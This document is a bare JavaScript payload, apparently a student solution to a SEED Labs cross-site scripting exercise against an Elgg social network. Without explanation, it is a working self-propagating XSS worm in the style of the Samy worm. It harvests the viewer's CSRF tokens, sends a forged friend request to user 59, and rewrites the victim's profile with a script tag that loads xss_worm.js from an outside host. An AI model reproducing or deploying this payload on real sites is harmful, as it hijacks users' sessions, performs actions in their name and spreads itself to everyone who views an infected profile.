<script type="text/javascript">
window.onload = function () {
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var guid = elgg.session.user.guid;
    var userName = "name=" + elgg.session.user.name;

    var samyGuid = "59";
    if (guid == samyGuid) return;

    // Step 1: Add Samy as a friend
    var friend_id = 59;
    var addFriendUrl = "http://www.seed-server.com/action/friends/add?friend=" + friend_id + ts + token;
    var xhr1 = new XMLHttpRequest();
    xhr1.open("GET", addFriendUrl, true);
    xhr1.send();

    // Step 2: Modify victim's profile with worm
    var wormCode = "<script type='text/javascript' src='http://10.9.0.1/xss_worm.js'></script>";
    var aboutMe = "&description=YOU HAVE BEEN HACKED :) " + wormCode;
    var content = token + ts + aboutMe + "&guid=" + guid + "&" + userName;
    var editProfileUrl = "http://www.seed-server.com/action/profile/edit";

    var xhr2 = new XMLHttpRequest();
    xhr2.open("POST", editProfileUrl, true);
    xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr2.send(content);
};
</script>
